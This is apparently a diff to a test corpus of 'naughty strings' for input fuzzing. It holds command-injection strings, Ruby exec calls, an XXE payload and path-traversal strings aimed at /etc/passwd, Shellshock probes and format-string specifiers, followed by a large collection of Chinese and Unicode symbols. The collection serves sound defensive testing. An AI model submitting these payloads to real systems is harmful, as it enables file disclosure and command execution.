+#	Strings which can cause user to run code on server as a privileged user (c.f. https://news.ycombinator.com/item?id=7665153)
+
+-
+--
+--version
+--help
+$USER
+/dev/null; touch /tmp/blns.fail ; echo
+`touch /tmp/blns.fail`
+$(touch /tmp/blns.fail)
+@{[system "touch /tmp/blns.fail"]}
+
+#	Command Injection (Ruby)
+#
+#	Strings which can call system commands within Ruby/Rails applications
+
+eval("puts 'hello world'")
+System("ls -al /")
+`ls -al /`
+Kernel.exec("ls -al /")
+Kernel.exit(1)
+%x('ls -al /')
+
+#      XXE Injection (XML)
+#
+#	String which can reveal system files when parsed by a badly configured XML parser
+
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
+
+#	Unwanted Interpolation
+#
+#	Strings which can be accidentally expanded into different strings if evaluated in the wrong context, e.g. used as a printf format string or via Perl or shell eval. Might expose sensitive data from the program doing the interpolation, or might just represent the wrong string.
+
+$HOME
+$ENV{'HOME'}
+%d
+%s%s%s%s%s
+{0}
+%*.*s
+%@
+%n
+File:///
+
+#	File Inclusion
+#
+#	Strings which can cause user to pull in files that should not be a part of a web server
+
+../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../etc/hosts
+
+#	Known CVEs and Vulnerabilities
+#
+#	Strings that test for known vulnerabilities
+
+() { 0; }; touch /tmp/blns.shellshock1.fail;
+() { _; } >_[$($())] { touch /tmp/blns.shellshock2.fail; }
+<<< %s(un='%s') = %u
++++ATH0
+
+#	MSDOS/Windows Special Filenames
+#
+#	Strings which are reserved characters in MSDOS/Windows
+
+CON
+PRN
+AUX
+CLOCK$
+NUL
+A:
+ZZ:
+COM1
+LPT1
+LPT2
+LPT3
+COM2
+COM3
+COM4
+
+#   IRC specific strings
+#
+#   Strings that may occur on IRC clients that make security products freak out
+
+DCC SEND STARTKEYLOGGER 0 0 0
+
+#	Scunthorpe Problem
+#
+#	Innocuous strings which may be blocked by profanity filters (https://en.wikipedia.org/wiki/Scunthorpe_problem)
+
+Scunthorpe General Hospital
+Penistone Community Church
+Lightwater Country Park
+Jimmy Clitheroe
+Horniman Museum
+shitake mushrooms
+RomansInSussex.co.uk
+http://www.cum.qc.ca/
+Craig Cockburn, Software Specialist
+Linda Callahan
+Dr. Herman I. Libshitz
+magna cum laude
+Super Bowl XXX
+medieval erection of parapets
+evaluate
+mocha
+expression
+Arsenal canal
+classic
+Tyson Gay
+Dick Van Dyke
+basement
+QQ起昵称专用特效字符
+︻︼︽︾〒↑↓☉⊙●〇◎¤★☆■▓「」『』◆◇▲△▼▽◣◥◢◣◤ ◥№↑↓→←↘↙Ψ※㊣∑⌒∩【】〖〗＠ξζω□∮〓※》∏卐√ ╳々♀♂∞①ㄨ≡╬╭╮╰╯╱╲ ▂ ▂ ▃ ▄ ▅ ▆ ▇ █ ▂▃▅▆█ ▁▂▃▄▅▆▇█▇▆▅▄▃▂▁
+
+箭头符号
+
+↑ ↓ ← → ↖ ↗ ↙ ↘ ↔ ↕ ➻ ➼ ➽ ➸ ➳ ➺ ➻ ➴ ➵ ➶ ➷ ➹
+
+▶ ➩ ➪ ➫ ➬ ➭ ➮➯ ➱ ➲ ➾ ➔ ➘ ➙ ➚ ➛ ➜
+
+➝ ➞ ➟ ➠ ➡ ➢ ➣ ➤ ➥ ➦ ➧ ➨ ↚ ↛ ↜ ↝ ↞ ↟ ↠ ↠ ↡
+
+↢ ↣ ↤ ↤ ↥ ↦ ↧ ↨ ⇄ ⇅ ⇆ ⇇ ⇈ ⇉ ⇊ ⇋ ⇌ ⇍ ⇎ ⇏ ⇐ ⇑ ⇒ ⇓
+
+⇔ ⇖ ⇗ ⇘ ⇙ ⇜ ↩ ↪ ↫ ↬ ↭ ↮ ↯ ↰ ↱ ↲ ↳ ↴ ↵ ↶ ↷ ↸ ↹
+
+☇☈ ↼ ↽ ↾ ↿ ⇀ ⇁ ⇂ ⇃ ⇞ ⇟ ⇠ ⇡ ⇢ ⇣ ⇤ ⇥ ⇦ ⇧ ⇨ ⇩ ⇪ ↺ ↻
+
+
+贴图字符大全
+A、希腊字母大写 ΑΒΓΔΕΖΗΘΙΚ∧ΜΝΞΟ∏Ρ∑ΤΥΦΧΨΩ
+B、希腊字母小写 α β γ δ ε ζ η θ ι κ λ μ ν ξ ο π ρ σ τ υ φ χ ψ ω
+C、俄文字母大写 АБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ
+D、俄文字母小写 а б в г д е ё ж з и й к л м н о п р с т у ф х ц ч ш щ ъ ы ь э ю я
+E、注音符号 ㄅㄉㄓㄚㄞㄢㄦㄆㄊㄍㄐㄔㄗㄧㄛㄟㄣㄇㄋㄎㄑㄕㄘㄨㄜㄠㄤㄈㄏㄒㄖㄙㄩㄝㄡㄥ
+F、拼音 ā á ǎ à、ō ó ǒ ò、ê ē é ě è、ī í ǐ ì、ū ú ǔ ù、ǖ ǘ ǚ ǜ ü
+G、日文平假名 ぁぃぅぇぉかきくけこんさしすせそたちつってとゐなにぬねのはひふへほゑまみむめもゃゅょゎを
+H、日文片假名 ァィゥヴェォカヵキクケヶコサシスセソタチツッテトヰンナニヌネノハヒフヘホヱマミムメモャュョヮヲ
+I、标点符号 ˉˇ¨‘’々～‖∶”’‘｜〃〔〕《》「」『』．〖〗【【】（）〔〕｛｝
+J、数字序号 ⅠⅡⅢⅣⅤⅥⅦⅧⅨⅩⅪⅫ①②③④⑤⑥⑦⑧⑨⑩一二三四五六七八九十
+K、数学符号 ≈≡≠＝≤≥＜＞≮≯∷±＋－×÷／∫∮∝∞∧∨∑∏∪∩∈∵∴⊥‖∠⌒⊙≌∽√
+L、单位符号 °′〃＄￡￥‰％℃¤￠
+M、制表符 ┌┍┎┏┐┑┒┓—┄┈├┝┞┟┠┡┢┣|┆┊┬┭┮┯┰┱┲┳┼┽┾┿╀╂╁╃
+N、特殊符号 §№☆★○●◎◇◆□■△▲※→←↑↓〓＃＆＠＼＾＿
+O、补充收集 ⊙●○①⊕◎Θ⊙¤㊣▂ ▃ ▄ ▅ ▆ ▇ █ █ ■ ▓ 回 □ 〓≡ ╝╚╔ ╗╬ ═ ╓ ╩ ┠ ┨┯ ┷┏ ┓┗ ┛┳⊥『』┌♀◆◇◣◢◥▲▼△▽⊿
+
+QQ个性签名大全
+κiξs ☆玉龙☆ ご☆—可珂 ≈☆肖◎静☆ ♀杀♀ ツ火龙り ⌒☆YWH☆⌒ ◥⊙坦⊙克⊙◤
+〓刹〓 奇遇+小Ｓ ♂桃∴子♀ しovの吐泡泡 ⌒ω⌒ ￡婷婷￡ ☆岩⊙飞★ ≮触电≯情缘
+传奇ゆ ※芩勤※ ★§狂§★ じ☆ve流星雨 ∧∧泡 ΘAMY￥Ж 【紫色流星】 ※永不言爱※
+『LY』 ▂★σ弧 №々龙※吻▲ ∧∞∧ Ж阿梁Θ o○朋友o○ ←①≯烟火≠ ≤C&c☆乐园≥
+￡劲￠ 【§杰§】 ^*^ゃ羞の羞 * ♀多情少女 酷ˇ明 ぱ伊男☆ 夜吻♂芭芘 ξ网狂少女ξ
+ξ流ぁ星ぷ ☆芸芸※ ╰☆真情人☆ ★〓张明〓★ 卐古愁 Ж阿梁Θ ☆剑※客☆ づぜ☆九☆妹
+№小猫 ╭●★★●╰ 梦*☆*瑶* ☆◆幽灵◆☆ 传奇ゆ ※婷＄婷§ ☆月光GRIL☆ →茶褒╆仔≮
+╰☆☆∮ ぷ芷柔ぷ ☆⌒_⌒☆ づ★冰封谷≈ ☆girl ╭①∞①╮ ★风の影★ ＳＶmm丫丫ｙ
+☆girl ~@_@~冷冰 ☆风ψ铃☆ ◥◤苹果◥◤ ~⊙ō⊙~ ＷeＳt囧Ｋ ┣┫糖の果 Ｉしovのyoｕ
+だ花魂だ ｓＳＺｚОo 冰 ★:）★ @_--3:16--_@ ￡婷婷￡ №:2^ǒ^ ㊣@_@㊣ROY☆ γ⌒_⌒γ卉
+☆FQ☆ ご★轩☆ゞ だ￥㊣╃じ ￠丫ぢ头ぢ￠ γ^ō^γ~ ΘAMY￥Ж じ☆ve熏伊草 ^o^星禾じ☆ve
+★亮亮★ ξ深蓝の爱ゞ 【☆宝♀贝☆】 ≈☆灵♂之☆梦♂☆≈ ＬｏＶё 爱 →♀Simleyt
+☆づ紫欣 ぁ★ぁラ☆ラ ☆梦琳2002☆ (=^o^=)泡(=^o^=) $刺#灵$ ぷＡ⌒囡ぷ ∮唯一∮
+○Оοo靓￡仔oο Оo泡泡♂灵儿oо ㊣〖热血同盟会〗㊣〓∮╰☆ Ψ【流※星¤狂※喷】Ψ
+★★靓妹爱帅哥〓魅力四射★★ ◆嗨－－天马流星拳 卐【●】拳【●】脚 ㊣〖热血同盟会〗㊣
+◣ミ非你不可↙╬↘非你不嫁ミ◥ ぷ风≈☆ば度☆≈☆翩☆ば≈翩☆ぷ ※卡摸卑鄙☆不要骗我※
+≮爱过伤过悔过哭过≯ ぷ￠◎ㄨ○搞基的你要唔要啊∩¤々♀♂ ^ǒ^*★*^ǒ^*☆*^ǒ^*
+♀★♂I☆★☆★Love★☆★☆You♂☆♀ う≮灬爱你不久メ就壹辈子灬≯う
+
+其它：
+
+
+๑•ิ.•ั๑ ๑๑ ♬✿.｡.:* ☂☃ ☄ ★ ☆ ☇ ☈ ☉ ☒☢ ☺ ☻ ☼ ☽☾ ♠ 　 ♡ ♢ ♣ ♤ ♥ ♦ ♧ ♨ ♩ εїз℡❣·۰•●○● ゃōゃ♥ ♡๑۩ﺴ ☜ ☞ ☎ ☏♡ ⊙◎ ☺ ☻✖╄ஐﻬ ► ◄ ▧ ▨ ♨ ◐ ◑ ↔ ↕ ▪ ▫ ☼ ♦ ? ▄ █▌ ?? ? ▬♦ ◊ ◦ ☼ ♠♣ ▣ ▤ ▥ ▦ ▩ ◘ ◙ ◈ ♫ ♬ ♪ ♩ ♭ ♪ の ☆ → あぃ ￡ ＃ ＠ ＆ ＊ ￥✰ ☆ ★ ¤ ☼ ♡ ღ☻ ☺ ⊕ ☉ Θ o O ㊝ ⊙ ◎ ◑ ◐ ۰ • ● ▪ ▫ ｡ ﾟ ๑ ☜ ☞ ♨ ☎ ☏ ︻ ︼ ︽ ︾ 〈 〉 ︿ ﹀ ∩ ∪ ﹁ ﹂﹃﹄﹝ ﹞ ＜ ＞ ≦ ≧ ﹤ ﹥ 「 」 ︵ ︶︷ ︸︹︺〔 〕 【 】 《 》 （ ） ｛ ｝ ﹙ ﹚ 『』﹛﹜╳ ＋ － ﹢ × ÷ ＝ ≠ ≒ ∞ ˇ ± √ ⊥ ∠ ∟ ⊿ ㏒ ▶ ▷ ◀ ◁ ★ ☆ ☉ ☒☢ ☺ ☻ ☼ ♠ ♡ ♣ ♤ ♥ ♦ ♧ ♨ ♩ ? ? ㍿ ♝ ♞ ♯♩♪♫♬♭♮ ☎ ☏ ☪ ♈ ♨ ºº ₪ ¤ 큐 « » ™ ♂✿ ♥ の ↑ ↓ ← → ↖ ↗ ↙ ↘ ㊣ ◎ ○ ● ⊕ ⊙ ○　 △ ▲ ☆ ★ ◇ ◆ ■ □ ▽ ▼ § ￥ 〒 ￠￡ ※ ♀ ♂ © ® ⁂ ℡ ↂ? ▣ ▤ ▥ ▦ ▧ ♂ ♀ ♥ ♡ ☜ ☞ ☎ ☏ ⊙ ◎ ☺ ☻ ► ◄ ▧ ▨ ♨ ◐ ◑ ↔ ↕ ♥ ♡ ▪ ▫ ☼ ♦ ? ▄ █ ▌ ? ? ? ▬ ♦ ◊ ◘ ◙ ◦ ☼ ♠ ♣ ▣ ▤ ▥ ▦ ▩ ◘ ◙ ◈ ♫ ♬ ♪ ♩ ♭ ♪ ✄☪☣☢☠ ⅰⅱⅲⅳⅴⅵⅶ ⅷⅸⅹⅺⅻⅠⅡⅢⅣⅤⅥⅦ Ⅷ Ⅷ ⅨⅩⅪⅫ ㊊㊋㊌㊍㊎㊏㊐㊑㊒㊓㊔㊕㊖㊗㊘㊜㊝㊞㊟㊠㊡㊢㊣㊤㊥㊦㊧㊨㊩㊪㊫㊬㊭㊮㊯㊰ ✗✘✚✪✣✤✥✦✧✩✫✬✭✮✯✰【】┱ ┲ ✓ ✔ ✕ ✖ *.:｡✿*ﾟ‘ﾟ･✿.｡.: ≧０≦ o(╥﹏╥)o //(ㄒoㄒ)// {{{(>_<)}}} ™ぷ▂▃▅▆█ ∏卐 ※◤ ◥ ﹏﹋﹌ ∩∈∏ ╰☆╮≠→№← ︵︶︹︺【】〖〗＠﹕﹗/ ' _ < > `,·。≈{}~ ～() _ -『』√ $ @ * & # ※卐 々∞Ψ ∪∩∈∏ の ℡ ぁ §∮〝〞ミ灬ξ№∑⌒ξζω＊ㄨ ≮≯ ＋－×÷﹢﹣±／＝∫∮∝ ∞ ∧∨ ∑ ∏ ∥∠ ≌ ∽ ≦ ≧ ≒﹤﹥じ☆ ■♀『』◆◣◥▲Ψ ※◤ ◥ →№←㊣∑⌒〖〗＠ξζω□∮〓※∴ぷ▂▃▅▆█ ∏卐【】△√ ∩¤々♀♂∞①ㄨ≡↘↙▂▂ ▃ ▄ ▅ ▆ ▇ █┗┛╰☆╮ ≠ ▂ ▃ ▄ ▅┢┦aΡｐy ♡^_^♡　^_^.......♧♧ ☜♥☞.︻︼─一　▄︻┻┳═一 ﹏◢ ◣ ◥ ◤ ▽ ▧ ▨ ▣ ▤ ▥ ▦ ▩ ◘ ◙ ▓ ? ? Café № ＠ ㊣ ™ ℡ 凸 の ๑۞๑ ๑۩ﺴ ﺴ۩๑ o(‧'''‧)o ❆ べò⊹⊱⋛⋋ ⋌⋚⊰⊹ ⓛⓞⓥⓔ べ ☀ ☼ ☜ ☞ ⊙® ◈ ♦ ◊ ◦ ◇ ◆ εїз ☆·.¸¸.·´¯`·.¸¸.¤ ~♡のⓛⓞⓥⓔ♡~☃⊹⊱⋛⋌⋚⊰⊹✗(*w*)\ ≡[。。]≡※◦º°×°º◦εїз´¯`·»｡｡♀♡╭☆╯ºØØºøº¤ø,¸¸,ºº¤øøºﷲﷲ°º¤ø,¸¸, げこごさざしじすぜそぞただちぢっつづてでとどなにぬねのはば ♪♫╭♥ ๑•ิ.•ัﻬஐ ✎ぱひびぴふぶぷへべぺほぼぽまみむめも ❃❂❁❀✿✾✽✼✻✺✹✸✷☀ o O ＃♡ ┽┊﹎.εїз︷✿‧:﹎｡❤‧:❉:‧ .｡.:*･❀●•♪.。‧:❉:‧ °º¤ø,¸¸,ø¤º°`°º¤ø*.:｡✿*ﾟ‘ﾟ･✿.｡.:*.:｡✿*ﾟ’ﾟ･✿.｡✎*εїз ↔ ↕ ▪ → ︷╅╊✿ (¯`•._.• •._.•´¯)(¯`•¸•´¯) ❤`•.¸¸.•´´¯`•• .¸¸.•´¯`•.•●•۰• ••.•´¯`•.•• ••.•´¯`•.••—¤÷(`[¤* *¤]´)÷¤——(•·÷[ ]÷·•)— 〓 ☆ ★┣┓┏┫×╰ノ◢ ◣ ◥ ◤ Ω ж ф юЮ ━╃ ╄━ ┛┗ ┓┏ ◇ ◆ ※ .'. ☂.'.❤ ♥ 『』 〖〗▓ ► ◄ ? ? ▓ ╮╭ ╯╰ ァ ┱ ┲☃ ☎ ☏ ☺ ☻ ▧ ▨ ♨ ◘ ◙ ♠ ♧ ♣ ▣▤ ▥ ▦ ▩ ⊕ ×º°”˜`”°º× ×º°”˜`”°º×»-(¯`v´¯)-» ×÷·.·´¯`·)» «(·´¯`·.·÷×*∩_∩* ⓛⓞⓥⓔ ╬ ╠ ╣∷ ღ ☃ ❆ ￡ ∆ Š Õ Ő ő ∞ © ‡ † Ž ஜ ஒ ண இ ஆ ௰ ♪♪♫▫—(•·÷[ ]÷·•)— ·÷±‡±±‡±÷· Oº°‘¨ ¨‘°ºO •°o.O O.o°• ¨°o.O O.o°¨—¤÷(`[¤* *¤]´)÷¤—•·.·´¯`·.·• •·.·´¯`·.·•´`·.(`·.¸ ¸.·´).·´`·» »-(¯`v´¯)-»█┗┛↘↙╰☆╮ ≠ ☜♥☞ ︻︼─一　▄︻┻┳═一 -─═┳︻　∝╬══→　::======>>　☆═━┈┈━═☆　┣▇▇▇═─ ■◆◣◥▲◤ ◥〓∴ぷ▂▃▅▆█ 【】 ๑۞๑ ๑۩ﺴﺴ۩๑๑۩۞۩...¤¸¸.·´¯`·.¸·..>>--» [[]] «--<<..·.¸¸·´¯`·.¸¸¤... .•:*´¨`*:•.☆۩ ۞ ۩ ۩ ۞ ۩☆•:*´¨`*:•. ❤`•.¸¸.•´´¯`••.¸¸.•´´¯`•´❤ ⊹⊱⋛⋋ ⋌⋚⊰⊹ 彡 ❝❞° ﹌﹎ ╱╲ ☁ ₪ ¡ Þ ௫ μ べ ☪ ☠ ╬ ╠ ╣∷ ღ :﹗/ ' _ < > `,·。≈ {}~ ～() - √ $ * & # ※＊≮≯ ＋－× ÷﹢±／＝∫∮∝ ∧∨∥∠ ≌ ∽ ≦ ≧ ≒﹤﹥じ ①②③④⑤⑥⑦⑧⑨⑩ ⑪⑫⑬⑭⑮⑯⑰⑱⑲⑳ ⒶⒷⒸⒹⓐⓑⓒⓓⓔⓕ ⓖⓗⓘⓙⓚⓛ ⓜⓝⓞⓟⓠⓡ ⓢⓣⓤⓥⓦⓧ ⓨⓩ 凸(⊙▂⊙✖ )(づ￣ ³￣)づヾ（*⌒ヮ⌒*）ゞ ( c//'-}{-*\\x) (-'๏_๏'-) (◐ o ◑ ) (⊙...⊙ )｡◕‿◕｡ ๏[-ิ_•ิ]๏(•ิ_•ิ)? \(•ิ_•ิ\) (/•ิ_•ิ)/ (︶︹︺)(*-`ω´- )人(ц｀ω´ц*)(●ゝω)ノヽ(∀＜●)(ㄒoㄒ)(>_<)⊙▂⊙ ⊙０⊙ ⊙︿⊙　⊙ω⊙　⊙﹏⊙　⊙△⊙　⊙▽⊙ o(‧'''‧)o (◡‿◡✿) (◕‿◕✿) (◕〝◕) (∩_∩)ミ●﹏☉ミ (≧０≦) o(╥﹏╥)o ㋀ ㋁㋂㋃㋄ ㋅ ㋆ ㋇ ㋈ ㋉ ㋊ ㋋ ㏠ ㏡ ㏢ ㏣ ㏤ ㏥ ㏦㏧㏨㏩ ㏪ ㏫ ㏬ ㏭ ㏮ ㏯ ㏰ ㏱ ㏲ ㏳ ㏴ ㏵ ㏶ ㏷㏸㏹㏺ ㏻ ㏼ ㏽ ㏾ ㍘ ㍙ ㍚ ㍛ ㍜ ㍝ ㍞ ㍟ ㍠ ㍡㍢㍣㍤ ㍥ ㍦ ㍧ ㍨ ㍩ ㍪ ㍫ ㍬ ㍭ ㍮ ㍯㍰㊛㊚
+
+*标点符号：．。，、；：？！ˉˇ¨`~ 々～‖∶＂＇｀｜·… — ～ - 〃
+
+‘’“”〝〞〔〕〈〉《》「」『』〖〗【】（）［］｛｝︻︼﹄﹃
+
+*数学符号：＋－×÷﹢﹣±／＝ ∥∠ ≌ ∽ ≦ ≧ ≒﹤﹥ ≈ ≡ ≠ ＝ ≤ ≥ ＜ ＞ ≮ ≯
+
+∷ ∶ ∫ ∮ ∝ ∞ ∧ ∨ ∑ ∏ ∪ ∩ ∈ ∵ ∴ ⊥ ∥ ∠ ⌒ ⊙ √∟⊿ ㏒ ㏑ ％ ‰
+
+*单位符号：㎎ ㎏ ㎜ ㎝ ㎞㎡㏄ ㏎ ㏑ ㏒ ㏕ ℡ ％ ‰ ℃ ℉ °′″＄ ￡ ￥ ￠ ♂ ♀℅
+
+*数字序号：① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ㈠ ㈡ ㈢ ㈣ ㈤ ㈥ ㈦ ㈧ ㈨ ㈩ №
+
+⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇
+
+⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛
+
+Ⅰ Ⅱ Ⅲ Ⅳ Ⅴ Ⅵ Ⅶ Ⅷ Ⅸ Ⅹ Ⅺ Ⅻ ⅰ ⅱ ⅲ ⅳ ⅴ ⅵ ⅶ ⅷ ⅸ ⅹ
+
+*希腊字母：Α Β Γ Δ Ε Ζ Η Θ Ι Κ Λ Μ Ν Ξ Ο Π Ρ Σ Τ Υ Φ Χ Ψ Ω
+
+α β γ δ ε ζ ν ξ ο π ρ σ η θ ι κ λ μ τ υ φ χ ψ ω
+
+*俄语字符：А Б В Г Д Е Ё Ж З И Й К Л М Н О П Р С Т У Ф Х Ц Ч Ш Щ Ъ Ы Ь Э Ю Я
+
+а б в г д е ё ж з и й к л м н о п р с т у ф х ц ч ш щ ъ ы ь э ю я
+
+*汉语拼音：ā á ǎ à ō ó ǒ ò ē é ě è ī í ǐ ì ū ú ǔ ù ǖ ǘ ǚ ǜ ü ê ɑ  ń ň ǹ ɡ
+
+ㄅㄆㄇㄈㄉㄊㄋㄌㄍㄎㄏㄐㄑㄒㄓㄔㄕㄖㄗㄘㄙㄚㄛㄜㄝㄞㄟㄠㄡㄢㄣㄤㄥㄦㄧㄨㄩ
+
+*中文字符：
+
+偏旁部首：横起：夬丅乛 竖起：丄丩乚 撇起：夊亅亇厃々 捺起：丂
+
+零 壹 贰 叁 肆 伍 陆 柒 捌玖拾 佰 仟 万 亿 吉 太 拍 艾 分 厘 毫 微
+
+卍 卐 卄 巜 弍 弎 弐 朤 氺曱甴 囍 兀 々 〆 の ぁ 〡 〢 〣 〤 〥 〦 〧 〨〩
+
+*日语：ぁあぃいぅうぇえぉおかがきぎくぐけげこごさざしじすずせぜそぞただちぢっつづてでとどなにぬねのはばぱひびぴふぶぷへべぺほぼぽまみむめもゃやゅゆょよらりるれろゎわゐゑをん
+
+*注音码：ァアィイゥウェエォオカガキギクグケゲコゴサザシジスズセゼソゾタダチヂッツヅテデトドナニヌネノハバパヒビピフブプヘベペホボポマミムメモャヤュユョヨラリルレロヮワヰヱヲンヴヵヶ
+
+*绘表符号：─━│┃┄┅┆┇┈┉┊┋┌┍┎┏┐┑┒┓└┕┖┗┘┙┚┛
+
+├┝┞┟┠┡┢┣┤┥┦┧┨┩┪┫┬┭┮┯┰┱┲┳┴┵┶┷┸┹┺┻
+
+┼┽┾┿╀╁╂╃╄╅╆╇╈╉╊╋
+
+═║╒╓╔╕╖╗╘╙╚╛╜╝╞╟╠╡╢╣╤╥╦╧╨╩╪╫╬╳
+
+╔ ╗╝╚ ╬ ═ ╓ ╩ ┠ ┨┯ ┷┏ ┓┗ ┛┳⊥﹃﹄┌╭╮╯╰
+
+表情符号：*^_^* ^*^ ^-^ ^_^ ^︵^
+
+*经典字符全收集：、。·ˉˇ¨〃々—～‖…‘’“”〔〕〈〉《》「」『』〖〗【】±＋－×÷∧∨∑∏∪∩∈√⊥∥∠⌒⊙∫∮≡≌≈∽∝≠≮≯≤≥∞∶ ∵∴∷♂♀°′″℃＄¤￠￡‰§№☆*〇○*◎** 回□*△▽⊿▲▼▁▂▃▄▆**▉▊▋▌▍▎▏※→←↑↓↖↗↘↙** ⅰⅱⅲⅳⅴⅵⅶⅷⅸⅹ①②③④⑤⑥⑦⑧⑨⑩⒈⒉⒊⒋ ⒌⒍⒎⒏⒐⒑⒒⒓⒔⒕⒖⒗⒘⒙⒚⒛⑴⑵⑶⑷⑸⑹⑺⑻⑼⑽⑾⑿⒀⒁⒂⒃⒄⒅⒆⒇㈠㈡㈢㈣㈤㈥㈦㈧㈨㈩ⅠⅡⅢⅣⅤⅥⅦⅧⅨⅩⅪⅫ！＂＃￥％＆＇（）＊＋，－．／０１２３４５６７８９：；＜＝＞？＠ＡＢＣＤＥＦＧＨＩＪＫＬＭＮＯＰＱＲＳＴＵＶＷＸＹＺ［＼］＾＿｀ａｂｃｄｅｆｇｈｉｊｋｌｍｎｏｐｑｒｓｔｕｖｗｘｙｚ｛｜｝ぁあぃいぅうぇえぉおかがきぎくぐけげこごさざしじすずせぜそぞただちぢっつづてでとどなにぬねのはばぱひびぴふぶぷへべぺほぼぽまみむめもゃやゅゆょよらりるれろゎわゐゑをんァアィイゥウェエォオカガキギクグケゲコゴサザシジスズセゼソゾタダチヂッツヅテデトドナニヌネノハバパヒビピフブプヘベペホボポマミムメモャヤュユョヨラリルレロヮワヰヱヲンヴヵヶΑΒΓΔΕΖΗΘΙΚΛΜΝΞΟΠΡΣΤΥΦΧΨΩαβγδεζηθ ικλμνξοπρστυφχψ ω︵︶︹︺︿﹀︽︾﹁﹂﹃﹄︻︼︷︸АБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯабвгдеёжзийклмнопрстуфхцчшщъыь эюāáǎàēéěèī íǐìōóǒòūúǔùǖǘǚǜüêɑńňǹɡㄅㄆㄇㄈㄉㄊㄋㄌㄍㄎㄏㄐㄑㄒㄓㄔㄕㄖㄗㄘㄙㄚㄛㄜㄝㄞㄟㄠㄡㄢㄣㄤㄥㄦㄧㄨㄩ︱︳︴﹏﹋﹌─━│┃┄┅┆ ┇┈┉┊┋┌┍┎┏┐┑┒┓└┕┖┗┘┙┚┛├┝┞┟┠┡┢┣┤┥┦┧┨┩┪┫┬┭┮┯┰┱┲┳┴┵┶┷┸┹┺┻┼┽┾┿╀╁╂╃╄ ╅╆╇╈╉╊╋♁㊣㈱曱甴囍∟┅﹊﹍╭ ╮╰ ╯ _ ^︵^﹕﹗/\ ' < > `,·。{}~～() -√ $ @ * & # 卐℡ ぁ〝〞ミ灬№＊ㄨ≮≯ ﹢﹣／∝≌∽≦≧≒﹤﹥じぷ┗┛￥￡§я-―‥…‰′″℅℉№℡∕∝∣═║╒╓╔╕╖╗╘╙╚╛╜╝╞╟╠╡╢╣╤╥╦╧╨╩╪╫╬╱ ╲╳▔▕〆〒〡〢〣〤〥〦〧〨〩㎎ ㎏ ㎜ ㎝ ㎞㎡㏄㏎㏑㏒㏕ǹ兀︰﹍﹎ ------
+
+*图形符号：
+
+
+? ? ▬ ♦ ◊ ◦ ♠ ♣ ▣ ۰•● ❤ ●•۰
+
+► ◄ ▧ ▨ ♨ ◐ ◑ ↔ ↕ ▪ ▫ ☼ ♦
+
+
+♧♡♂♀♠♣♥❤☜☞☎☏⊙◎ ☺☻☼▧▨♨◐◑↔↕▪ ? ◊◦▣▤▥ ▦▩◘ ◈◇♬♪♩♭♪の★☆→あぃ￡Ю〓§♤♥▶¤๑⊹⊱⋛⋌⋚⊰⊹
+
+≈ ๑۩۩.. ..۩۩๑ ๑۩۞۩๑ ✲ ❈ ✿ ✲ ❈ ➹ ~.~ ◕‿-｡ ☀☂☁【】┱ ┲ ❣ ✚ ✪ ✣ ✤ ✥ ✦❉ ❥ ❦ ❧ ❃ ❂ ❁ ❀ ✄ ☪ ☣ ☢ ☠ ☭
+
+
+ღღღ ▶ ▷ ◀ ◁ ☀ ☁ ☂ ☃ ☄ ★ ☆ ☇ ☈ ⊙ ☊ ☋ ☌ ☍ⓛⓞⓥⓔ ╬ 『』∴ ☀ .｡◕‿◕｡ ♫ ♬ ♩ ♭ ♪ ☆ ∷ ﹌ の ★ ◎ ▶☺ ☻ ► ◄ ▧ ▨ ♨ ◐ ◑ ↔ ↕↘ ☼ ? ▄ █ ▌? ? ▬ ♦ ◊
+
+☜ ☞ ? ? ?▬ ♦ ◊ ◦ ☼ ♪ の ☆→ ♧ ぃ ￡ ❤ ｡◕‿◕｡ ✎ ✟ஐ
+
+?????☆★△▲????♂♀????????2±D|?3a??⊙●○①♁◎Θ⊙¤▂ ▃ ▄ ▅ ▆ ▇ █ █ ■ ▓ 回 □ 〓≡ ╝╚╔ ╗╬ ═ ╓ ╩ ┠ ┨┯ ┷┏ ┓┗ ┛┳⊥﹃﹄┌♀◆◇◣◢◥▲▼△▽⊿ ︻︼︽︾〒↑↓☉⊙●〇◎¤★☆■▓「」『』◆◇▲△▼▽◣◥◢◣◤ ◥№↑↓→←↘↙Ψ※㊣∑⌒∩【】〖〗＠ξζω□∮〓※》∏卐√ ╳々♀♂∞①ㄨ≡╬╭╮╰╯╱╲ ▂ ▂ ▃ ▄ ▅ ▆ ▇ █ ▂▃▅▆█ ▁▂▃▄▅▆▇█▇▆▅▄▃▂▁ ╬　▁▂▃▄▅▆▇█▇▆▅▄▃▂▁　╭╮　╰╯　▓　【】　▲　╱╲　△　▼　▽ ◆　◇　○　◎　●　◢◣　◤◥　★　☆　☉　♀　♂　〇　》　「」　『』〒　〓　〖〗　︻︼　︽︾　¤　╳　↑　↓　⊙■ ◣◥　Ψ　※　→№←　㊣　∑　⌒　＠ ξ　ζ　ω　□　∮　〓　∏　卐　√　∩　々　∞　①　ㄨ　≡　↘↙ ↑↓⊙●★☆■♀『』◆◣◥▲Ψ ※◤ ◥ →№←㊣∑⌒〖〗＠ξζω□∮〓※ ∴ぷ ▂▃▅▆█ ▓∏卐【】△√ ∩¤々♀♂∞①ㄨ≡↘↙▂ ▂ ▃ ▄ ▅ ▆ ▇
+
+
+♡.1　⊙●○①♁◎Θ⊙¤㊣★☆♀◆◇◣◢◥▲▼△▽⊿◤ ◥　　　　
+
+♡.2　▆ ▇ █ █ ■ ▓ 回 □ 〓≡ ╝╚╔ ╗╬ ═ ╓ ╩ ┠ ┨┯ ┷┏
+
+♡.3　┓┗ ┛┳⊥『』┌ ┐└ ┘∟「」↑↓→←↘↙♀♂┇┅ ﹉﹊﹍﹎╭
+
